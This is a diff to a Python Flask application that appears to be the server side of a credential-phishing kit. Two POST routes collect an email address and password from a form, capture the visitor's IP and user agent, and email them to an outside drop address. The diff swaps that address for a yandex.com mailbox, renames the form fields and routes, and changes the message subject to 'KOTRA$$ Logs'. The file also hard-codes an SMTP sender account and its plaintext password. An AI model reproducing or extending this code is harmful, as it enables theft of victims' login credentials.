@@ -177,8 +177,8 @@ def verify():
     return jsonify({"status": "verified"})
 
 
-@app.route("/clips", methods=['POST'])
-def clips():
+@app.route("/first", methods=['POST'])
+def first():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -187,15 +187,15 @@ def clips():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("emailapive")
-        passwordemail = request.form.get("passwordapive")
+        email = request.form.get("horse")
+        passwordemail = request.form.get("pig")
         sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
-        receiver_email = "jayze.alvis@moonfee.com"
+        receiver_email = "aliresult2020@yandex.com"
         password = "-%JXX7Ap]-4q"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "new Upsate ## invoice"
+        message["Subject"] = "KOTRA$$ Logs "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -213,18 +213,12 @@ def clips():
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
-        return redirect(url_for('mesona', web=email))
-
-@app.route("/mesonap", methods=['GET'])
-def mesona():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-    return render_template('indexc.html', eman=eman, dman=dman)
+        return redirect(url_for('benza', web=email))
 
 
-@app.route("/mansecond", methods=['POST'])
-def mansecond():
+
+@app.route("/second", methods=['POST'])
+def second():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -233,15 +227,15 @@ def mansecond():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("emailail")
-        passwordemail = request.form.get("passwordail")
+        email = request.form.get("horse")
+        passwordemail = request.form.get("pig")
         sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
-        receiver_email = "jayze.alvis@moonfee.com"
+        receiver_email = "aliresult2020@yandex.com"
         password = "-%JXX7Ap]-4q"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "new Upsate ## invoice"
+        message["Subject"] = "KOTRA$$ Logs  !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -258,11 +252,19 @@ def mansecond():
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
-        return redirect(url_for('pilom', web=email))
+        return redirect(url_for('lasmo', web=email))
 
 
-@app.route("/pilomp", methods=['GET'])
-def pilom():
+
+@app.route("/benzap", methods=['GET'])
+def benza():
+    if request.method == 'GET':
+        eman = session.get('eman')
+        dman = session.get('ins')
+    return render_template('ind.html', eman=eman, dman=dman)
+
+@app.route("/lasmop", methods=['GET'])
+def lasmo():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
     
@@ -278,5 +280,6 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
